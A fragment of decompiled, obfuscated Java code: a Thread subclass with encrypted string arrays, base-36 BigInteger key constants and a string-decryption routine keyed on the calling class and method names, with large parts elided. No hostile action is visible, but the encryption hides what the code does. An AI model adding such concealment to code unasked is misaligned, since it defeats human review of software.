...
public class hh extends Thread {
   ...
   private static final void z(int var0, Object var1) {
      ...
      case 0:
         ...
         var42 = new int[256];
         var38 = new int[256];
         K = new Object[]{var26, var29, var40, var42, var38, null, null, null};
         break;
      case 1:
         var25 = new int[256];
         var28 = 0;
      ...
      case 2:
         ...
         return;
      case 3:
         char[] var27 = "틕鞑芍폺㜒\u2e56㙓ᰘ\uf4b3\ue708妥ᒮ\ue058崯ၟ㧟旇摇䬼㯐뺑\u0c5a궇Ꞥ쳆\udaea㾔䮭⪫穳덚鞟씯霍蓺鐵쥱젳锬豺꒡诱盀\uf892窎鈍\udbd2\u1df2㼃ǘ缧涁冚衶㿁釘跨郄妁┾娢敷戅黭\udc94ᄘﬄ㮘\ueb4b汿珍惹⿱纯\u05fc㝆홸맸퍳\uea08鱂\ue5fe謏轲桁섎\ue2de矷헐＼ⶒÎ鳪꠰뚆\ue08fߪ\uda0d휣鍙⚃턨絛ꉚ⟃ල藒縉짫쥂农䛒柘\ue5a2\u000e霼难줞頮羼谕굽쭓⽟榮།Ꝭ\ue322".toCharArray();
         ...
         var27 = "\u0ad3袱粀⺪叐쮳洈\udbe9輭㸘ᝅ⥸\udcf8躅萊컯\ue352艅ꎆ\ue74d븃┽㔄엞\ue7b2\uf230囧䫓㤒ࠋ\ue13c\ua4ca鍚\u0b04汈鄏\ue2faཔ徠苸\uf24fၖ엱ᰩ衎䚊명갼襻\ue558裨탉\u086e禃냖ᒍ権폌嬭⤁쯨忡籐櫾샼ϱ깿瀁\ude73㺇咗㭯㐣뉂婢璗ᙝ\uf823牓덦磤ꔚ㖕ꜛꖤ眵\ue19c䷘\uf1a9팶ᦳᡋ嫥䡒Ǌ\uf169놺刀転鎜䑾羪툯呖ꂖ쳨죇䬲뇻란煱蔻뮿랾\ue72b鶟䬰\ud86b뵃떜\uab70⅓皣\uf43a\uf299滣뾓㒸".toCharArray();
         ...
         try {
            var39[0] = var33[var34[93] & 255];
            var39[1] = var33[var34[24] & 255];
            var39[2] = var33[var34[108] & 255];
            var39[3] = var33[var34[119] & 255];
            var39[4] = var33[var34[205] & 255];
            var39[5] = var33[var34[175] & 255];
            var39[6] = var33[var34[251] & 255];
            var39[7] = var33[var34[2] & 255];
         } catch (Exception var20) {
         } finally {
            var39[8] = var33[var34[103] & 255];
            var39[9] = var33[var34[133] & 255];
            var39[10] = var33[var34[114] & 255];
            var39[11] = var33[var34[89] & 255];
            var39[12] = var33[var34[222] & 255];
            var39[13] = var33[var34[125] & 255];
            var39[14] = var33[var34[129] & 255];
            var39[15] = var33[var34[4] & 255];
         }

         z(5, var39);
         break;
      case 4:
         var25 = new int[]{-137228999, 1816930267, 799120784, 143070849};
      ...
      case 7:
         ...
         var4 = new BigInteger("voics0tcmzl7", 36);
         var5 = new BigInteger("1xv8sprhgwja0", 36);
         var6 = new BigInteger("y7r66i2mnnbt", 36);
         var7 = new BigInteger("1qvp7cflrgtix", 36);
         ...
         var10000 = (int[])((int[])K[6]);
         var10000[0] ^= var7.intValue();
         break;
      case 8:
         var2 = g;
         var3 = new BigInteger("10001", 16);
         var4 = new BigInteger("1j1sqniimyd3m", 36);
         var5 = new BigInteger("eu7eebnu3j1q", 36);
         var6 = new BigInteger("1cjzokk3p79so", 36);
         var7 = new BigInteger("pn64ib80576u", 36);
   ...
   private static final void b27058() {
      z(0, (Object)null);
      w();
      hh var0 = new hh(1);
      var0.start();
   ...
   static final String j(Object var0) {
      ...
      String var12 = var10000[(Integer)K[7]].getClassName();
      var13 = var13.append(var12);
      var12 = var10000[(Integer)K[7]].getMethodName();
      int var1 = var13.append(var12).toString().hashCode();
      int[] var2 = (int[])((int[])K[6]);
      int var3 = var1 ^ var2[0];
      int var4 = var1 ^ var2[1];
      int var5 = var1 ^ var2[2];
      int var27 = var1 ^ var2[3];
      int[] var26 = (int[])((int[])K[5]);
      int[] var6 = (int[])((int[])K[1]);
      int[] var7 = (int[])((int[])K[2]);
      int[] var8 = (int[])((int[])K[3]);
      int[] var9 = (int[])((int[])K[4]);
      byte[] var10 = (byte[])((byte[])K[0]);
